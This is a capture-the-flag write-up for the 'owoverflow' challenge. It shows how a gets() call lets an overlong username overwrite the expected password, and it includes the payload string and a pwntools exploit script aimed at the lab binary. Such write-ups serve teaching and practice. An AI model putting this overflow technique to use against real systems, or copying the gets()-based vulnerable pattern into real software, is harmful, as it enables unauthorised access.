# owoverflow

## Challenge

We are presented with a prompt for a username and password.
If we try guessing the username and password, the program indicates our inputs were incorrect.

```
username: Green-Avocado
password: Password123
Invalid username
```

Looking at the source code, we can see that there is a `win` function that will print the flag.

```c
void win() {
    FILE* flagfile = fopen("flag.txt", "r");

    if (flagfile == NULL) {
        puts("Error: flag.txt does not exist, contact an admin!");
        exit(1);
    }

    fgets(flag, FLAG_LEN, flagfile);
    puts(flag);
}
```

The code in `vuln` checks that we have the correct username and password.
If our login is correct, it calls the `win` function.
Otherwise, it prints an error message and exits.

```c
printf("username: ");
gets(username);

printf("password: ");
gets(password);

if (strncmp(expected_username, username, 16) != 0) {
    puts("Invalid username");
    exit(0);
}

if (strcmp(expected_password, password) != 0) {
    puts("Invalid password");
    exit(0);
}

win();
```

## Solution

If we look at the start of the `vuln` function,
we can see that the expected username is `maple_bacon_user`.

```c
void vuln() {
    char expected_username[32] = "maple_bacon_user";
    char username[32];
    char expected_password[32];
    char password[32];
```

This gives us the correct username if we try to log in:

```
username: maple_bacon_user
password: Password123
Invalid password
```

Great!
But we still don't have the correct password.

If we look at the part of `vuln` that sets the expected password:

```c
// get random string for expected password
getentropy(expected_password, sizeof(expected_password) - 1);

// ensure no null bytes in expected password
for (unsigned int i = 0; i < sizeof(expected_password) - 1; i++) {
    expected_password[i] |= 1;
}
```

we can see that the password is 31 random bytes, with no null bytes except at the end.
This means we cannot reverse engineer the password and it is not practical to guess the password.

Let's look at how the username and password are read:

```c
printf("username: ");
gets(username);

printf("password: ");
gets(password);
```

If we look at the manual for `gets`:

> ### Bugs
>
> Never use gets().
> Because it is impossible to tell without knowing the data in advance how many characters gets()
> will read, and because gets() will continue to store characters past the end of the buffer,
> it is extremely dangerous to use.
> It has been used to break computer security.
> Use fgets() instead. 

Look again at the order in which variables are declared:

```c
char expected_username[32] = "maple_bacon_user";
char username[32];
char expected_password[32];
char password[32];
```

We call `gets` on `username`, so we can overwrite `expected_password` and `password`.
The latter overwrite is useless, as we will write there anyways later.
Overwriting `expected_password` allows us to change the password from random bytes to something we know.

So we need to overflow the `username` buffer and change the expected password.
However, we still need the username to be correct.

Since the function for checking the username only compares the first 16 characters,
we can fill the remainder of the buffer with anything, as these are ignored.

```c
if (strncmp(expected_username, username, 16) != 0) {
    puts("Invalid username");
    exit(0);
}
```

So a username like `maple_bacon_userAAAAAAAABBBBBBBB` will pass the username check and fill the buffer.
Anything we write past this becomes the new `expected_password`.

To make the password `fakepass`, we can send `maple_bacon_userAAAAAAAABBBBBBBBfakepass`:

```
username: maple_bacon_userAAAAAAAABBBBBBBBfakepass
password: fakepass
maple{n0t1c3s_buff3r_0v3rf10w}
```

Once we enter our new password, the program prints the flag for us.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1338 owoverflow
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('owoverflow')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1338)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.sendlineafter(b'username: ', b'maple_bacon_user' + b'A' * 16 + b'fakepass');

io.sendlineafter(b'password: ', b'fakepass');

io.interactive()
```

## Flag

```
maple{n0t1c3s_buff3r_0v3rf10w}
```
